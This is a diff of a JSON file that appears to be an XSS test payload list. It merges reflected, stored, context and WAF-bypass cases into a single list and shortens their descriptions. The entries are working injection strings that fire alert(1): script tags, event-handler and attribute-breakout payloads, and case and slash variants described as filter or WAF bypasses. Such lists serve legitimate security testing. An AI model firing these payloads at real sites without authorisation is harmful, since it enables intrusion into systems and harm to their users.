@@ -1,70 +1,60 @@
 {
   "vulnerability": "Cross-Site Scripting (XSS)",
-  "reflected_cases": [
+  "cases": [
     {
       "id": "xss-script-01",
       "payload": "<script>alert(1)</script>",
-      "description": "Basic script tag injection — executes immediately on page load."
+      "description": "Basic script tag injection."
     },
     {
       "id": "xss-img-01",
       "payload": "<img src=x onerror=alert(1)>",
-      "description": "Image tag with onerror event handler injection."
+      "description": "Image onerror handler injection."
     },
     {
       "id": "xss-svg-01",
       "payload": "<svg onload=alert(1)>",
-      "description": "SVG tag with onload event handler injection."
+      "description": "SVG onload handler injection."
     },
     {
       "id": "xss-attr-break-01",
       "payload": "\"><script>alert(1)</script>",
-      "description": "Breaks out of an HTML attribute before injecting a script tag."
+      "description": "Attribute breakout injection."
     },
     {
       "id": "xss-quote-break-01",
       "payload": "'><script>alert(1)</script>",
-      "description": "Breaks out of a single-quoted attribute before injecting a script tag."
-    }
-  ],
-  "stored_cases": [
+      "description": "Single-quote breakout injection."
+    },
+    {
+      "id": "waf-bypass-01",
+      "payload": "<ScRiPt>alert(1)</ScRiPt>",
+      "description": "Case variation WAF bypass."
+    },
+    {
+      "id": "waf-bypass-02",
+      "payload": "<img/src=x onerror=alert(1)>",
+      "description": "Slash variant WAF bypass."
+    },
+    {
+      "id": "waf-bypass-03",
+      "payload": "<details open ontoggle=alert(1)>",
+      "description": "ontoggle event WAF bypass."
+    },
+    {
+      "id": "waf-bypass-04",
+      "payload": "<input onfocus=alert(1) autofocus>",
+      "description": "Autofocus WAF bypass."
+    },
     {
       "id": "xss-stored-01",
       "payload": "<script>alert(1)</script>",
-      "description": "Stored script injection — persists in the database and executes on every page load."
+      "description": "Stored script injection."
     },
     {
       "id": "xss-stored-img-01",
       "payload": "<img src=x onerror=alert(1)>",
-      "description": "Stored image tag with onerror handler — persists and executes on view."
+      "description": "Stored image onerror injection."
     }
-  ],
-  "context_payloads": {
-    "html": [
-      "<script>alert(1)</script>",
-      "<img src=x onerror=alert(1)>",
-      "<svg onload=alert(1)>",
-      "<body onload=alert(1)>"
-    ],
-    "attr": [
-      "\"><script>alert(1)</script>",
-      "\" onmouseover=\"alert(1)",
-      "' onmouseover='alert(1)",
-      "\" autofocus onfocus=\"alert(1)"
-    ],
-    "js": [
-      "\";alert(1)//",
-      "';alert(1)//",
-      "</script><script>alert(1)</script>"
-    ]
-  },
-  "waf_bypass_cases": [
-    {"id": "waf-bypass-01", "payload": "<ScRiPt>alert(1)</ScRiPt>", "description": "Case variation to evade case-sensitive filters."},
-    {"id": "waf-bypass-02", "payload": "<img/src=x onerror=alert(1)>", "description": "Slash instead of space to evade naive space filters."},
-    {"id": "waf-bypass-03", "payload": "<svg/onload=alert(1)>", "description": "Slash variant on SVG tag."},
-    {"id": "waf-bypass-04", "payload": "<details open ontoggle=alert(1)>", "description": "Lesser-known event handler (ontoggle) to evade blocklists."},
-    {"id": "waf-bypass-05", "payload": "<input onfocus=alert(1) autofocus>", "description": "Autofocus + onfocus combo, triggers without user interaction."},
-    {"id": "waf-bypass-06", "payload": "<iframe srcdoc='<script>alert(1)</script>'>", "description": "Nested payload inside iframe srcdoc attribute."},
-    {"id": "waf-bypass-07", "payload": "<math><mtext></mtext></math><script>alert(1)</script>", "description": "Unusual tag structure to bypass simple tag blocklists."}
   ]
 }
